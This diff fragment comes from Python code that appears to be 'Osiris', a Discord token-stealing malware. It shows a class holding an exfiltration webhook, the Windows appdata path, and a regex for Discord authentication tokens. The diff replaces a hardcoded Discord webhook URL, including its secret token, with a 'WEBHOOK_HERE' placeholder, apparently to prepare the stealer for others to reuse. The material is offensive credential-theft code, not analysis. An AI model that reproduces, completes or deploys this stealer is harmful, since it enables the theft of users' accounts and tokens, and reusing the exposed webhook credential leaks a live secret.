@@ -26,7 +26,7 @@ def headers_gen(token=None):
 
 class Osiris:
     def __init__(self):
-        self.webhook = "https://discord.com/api/webhooks/1015281877210365952/_SvCEoGvV4ZEmk4jhIb3Rwkdb4ZOc60lIxAWGoNA3o6aZX-zofq_SSRzSQZbrjXkxRgD"
+        self.webhook = "WEBHOOK_HERE"
         self.appdata = os.getenv("appdata")
         self.roaming = os.getenv("appdata")
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
